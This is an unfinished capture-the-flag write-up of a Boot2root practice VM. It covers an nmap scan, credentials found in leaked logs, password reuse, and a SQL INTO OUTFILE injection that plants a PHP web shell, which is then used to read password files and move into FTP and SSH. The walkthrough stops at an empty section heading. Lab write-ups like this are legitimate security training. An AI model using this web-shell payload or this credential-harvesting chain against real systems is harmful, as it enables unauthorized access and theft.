# Method 1

### FIND VMs ID

Let's configure 'virtual host adapter (192.168.56.1/24)' network to our VM and find it's IP.

```bash
MacBook-Pro-admin:~ avdementev$ nmap 192.168.56.1-255
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 00:09 MSK
Nmap scan report for 192.168.56.1
Host is up (0.00010s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
111/tcp  open  rpcbind
999/tcp  open  garcon
1021/tcp open  exp1
1023/tcp open  netvenuechat
2049/tcp open  nfs

Nmap scan report for 192.168.56.100
Host is up (0.00038s latency).
All 1000 scanned ports on 192.168.56.100 are closed

Nmap scan report for 192.168.56.101
Host is up (0.00068s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 255 IP addresses (3 hosts up) scanned in 81.90 seconds
```

The result IP will be like 192.168.56.x (In this case - 192.168.56.100)

### Scan 80 and 443
Let's open http://192.168.56.100
(TODO: add 1.png)

We will use penteesting tools like Burp Suite or dirb.
```bash
TODO: burp example
```

### FORUM - Probleme login ?

```
....
....
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```
!q\]Ej?*5K5cy*AJ - PASSWORD???
After some tries we got password for lmezards forum account
```
lmezard:!q\]Ej?*5K5cy*AJ
```
(TODO: add 2.png)

Lmezards mail is laurie@borntosec.net
Let's try to access to 192.168.56.x/forum with the same password

```
laurie@borntosec.net:!q\]Ej?*5K5cy*AJ
```

There is the message DB Access:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

Now we can to access 192.168.56.x/phpmyadmin
(TODO: add 4.png)

### Reverse Shell


The basic reverse shell injection looks litke this

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/backdoor.php"
```
It does not work becouse permission denied.

But it works:
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile '/var/www/forum/templates_c/backdoor.php'
```

Now we can use this php like shell.

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=ls%20/home
```
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
```

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATAME
```
password
```

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
```
lmezard:G!@M6f4Eatau{sF"
```

And now we can to pass this data to ssh or ftp.
FTP is ok.
(TODO: add 5.png)

### Sort files (Lmezerd)

There are two files fun and README.md
```
MacBook-Pro-admin:lmezard avdementev$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

MacBook-Pro-admin:lmezard avdementev$ file fun
fun: POSIX tar archive (GNU)
MacBook-Pro-admin:lmezard avdementev$ tar xvf fun
x ft_fun/
x ft_fun/C4D03.pcap
x ft_fun/GKGEP.pcap
..
x ft_fun/Y8S1M.pcap
MacBook-Pro-admin:lmezard avdementev$ ls -l ft_fun/ | wc -l
     751
MacBook-Pro-admin:lmezard avdementev$ 
```

There are 751 file with pieces of code... The solve program in lmezard folder.

We got password:
```
Iheartpwnage
sha256(Iheartpwnage) = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

Let's connect to SSH:
```
laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

### Reverse program (laurie)

```
laurie@192.168.56.101's password:
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

Lets download bomb file and open it in IDA.

```
MacBook-Pro-admin:Boot2root avdementev$ scp laurie@192.168.56.101:/home/laurie/bomb ./laurie
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password: 
bomb                                                                                                                                  100%   26KB  18.4MB/s   00:00  
```

### Phase1

![phase1](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_1.png)

### Phase2
![phase2](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_2.png)

### Phase3
![phase3](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_3.png)

### Phase4
![phase4](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_4.png)

### Phase5
![phase5](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_5.png)

### Phase6

## Torture (Thor)
